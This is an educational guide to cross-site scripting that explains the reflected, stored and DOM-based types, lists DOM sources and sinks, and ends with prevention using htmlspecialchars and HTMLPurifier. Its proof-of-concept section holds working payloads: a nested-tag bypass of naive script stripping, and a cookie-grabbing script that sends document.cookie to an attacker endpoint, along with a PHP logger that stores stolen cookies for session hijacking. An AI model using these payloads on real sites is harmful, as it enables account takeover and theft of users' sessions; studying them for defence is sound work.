# Website Vulnerabilities - XSS
> July 1st, 2023
----------------------------------------------------------------

## Author's Note

All of this is strictly for educational purposes only. I do not condone illegal activity. Please use this guide solely to educate yourself on how to protect your website. 

## Introduction

By default any Javascript code will run in your browser. Some websites don't do a good job at sanitizing their user input which can lead to devastating impacts. 

When someone is able to post onto a website, use Inspect Element to see if the website processes special characters such as: `< > ;`. If it doesn't encode them or use any other forms of sanitization, there could be a chance of XSS being possible

## Reflected XSS

Payload is reflected off the web server. Carried out through a single request/response cycle

## Stored XSS

Payload is permanently stored on target server such as a DB. The victim retrieves the maliciosu script from the server when it requests the stored infromation. Also known as Persistent XSS. Typically, you would see stored XSS on a blog, comment, or reply. As long as the website saves the user input on the database and echos it back to the website, there should be stored XSS. 

To search for Stored based XSS, look for features on the website where information is stored, and hopefully, shown back to the user. 

## DOM-based XSS

XSS attack where payload is executed as a result of modifying the DOM environment in the victim's browser used by the original client side script, so that the client side code runs in an unexpected manner. The page itself (HTTP response) doesn't change, client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

In DOM-based XSS the malicious code is never sent to the server. The injection-point is somewhere where javascript has access. 

The typical example of how this works is with URLs.

The user is able to control the URL with the help of the hash-symbol `#`. If we add that symbol to a URL the browser will not include that characters that comes after it in the requet to the server.

`https://example.com/#this_is_not_sent_to_server`

However, the complete URL is included in DOM-objects.

```txt
document.URL
# will generate this output: https://example.com/#this_is_not_sent_to_server
```

**Source**

So in order to inject and execute a DOM-based XSS we need a injection-point (called source) and a point of execution (called sink).

In the example above `document.URL` is our source. Example of other sources are:

```txt
document.URL
document.documentURI
document.URLUnencoded (IE 5.5 or later Only)
document.baseURI
location
location.href
location.search
location.hash
location.pathname
window.name
document.referrer
```

**Sinks**

```txt
eval    
setTimeout      
setInterval     
setImmediate    
execScript      
crypto.generateCRMFRequest      
ScriptElement.src       
ScriptElement.text      
ScriptElement.textContent       
ScriptElement.innerText         
anyTag.onEventName

document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

DOM based cross site scripting occurs when JavaScript code accepts a user’s input (source) and passes that input to another function that displays the results back to the page (sink) in an unsafe manner. 

Source: A source function is any JS property or function that accepts user input from somewhere on the page. An example of a source is the location.search property because it reads input from the query string.

Sink: A sink is a potentially dangerous JavaScript function that can caused undesirable effects if attacker controlled data is passed to it. Basically, if the function returns input back to the screen as output without security checks, it’s considered a sink. An example of this would be the “innerHTML” property used earlier as that changes the contents of the HTML page to whatever is given to it.

> https://chryzsh.gitbooks.io/pentestbook/content/dom-based-xss.html
> https://yewtu.be/watch?v=-9QN_kGPkEc
> https://portswigger.net/web-security/cross-site-scripting/dom-based
> https://github.com/Sivnerof/Sources-And-Sinks-Cheatsheet
> https://medium.com/@fath3ad.22/understanding-dom-based-xss-sources-and-sinks-c17ae4bc7455

## Exploit code or POC

**Check for XSS**
```javascript
// Better versions as explained here: https://vid.puffyan.us/watch?v=KHwVjzWei1c
<script>alert(document.domain)</script>
<script>alert(domain.origin)</script>
<script>alert(window.origin)</script>
```
If you get an alert box that displays information about the above, you may have just found XSS!

**Poor sanitization technique**

If you are given access to source code, analyze any input the user is able to make. Some websites will have poor sanitzation techinques such as removing only `<script>` tags. This can be defeated very easily in multiple ways:
```javascript
<scr<script>ipt>alert(1)<scr<script>ipt>
```

The website looks for any input that says `<script>`, and when it does, it turns it into nothing. Then it processes whatever the user has left.
```javascript
// Before
<scr<script>ipt>alert(1)<scr<script>ipt>
	
// After sanitzation
<script>alert(1)<script>
	
// Pop-up window shows = Pwned!
```

**Data grabber for XSS**

Below sends a session cookie to the attacker's machine which will usually have a listener like Netcat or Python HTTP server

```javascript
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
```

The cookie.php file:
```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

Once we have someone's session cookie, we can use Firefox's developer tool to add in this cookie so we can perform an attack known as **session hijacking**.

Use the XSS README.md file for more information and obfuscation techniques

## How to prevent XSS attacks?

One way to prevent XSS from happening is to encode special characters. We do this by using htmlspecialchars() in PHP. When do we do this? Whenever we want to echo user supplied data back onto the website. Example:

```php
// Some random html junk that gets a user's username
echo(htmlspecialchars($_POST['username']));
```

In the case where you CANNOT use htmlspecialchars, at the very least, use an HTML parser/sanitizer library that tries to sanitize input. For example, when installing Quill text editor, you cannot use htmlspecialchars because it would break the formatting of the post. Therefore, I settled with the 2nd best option, which was to use a library to handle sanitization. 

The best one I can find for PHP is: https://github.com/ezyang/htmlpurifier

**Update to Quill Editor**
I just realized that Quill editor sanitizes bad input by default, but despite this, THIS IS STILL CLIENT SIDE CODE, AND THEREFORE MANIPULATABLE BY CLIENTS! Therefore, you NEED client-side sanitization AND server-side sanitization. So it's good to have htmlpurifier.

**Extra Resources**

https://xss-payloads.paracyberbellum.io/payloads.html

https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.html

https://owasp.org/www-community/attacks/xss/

https://github.com/ezyang/htmlpurifier
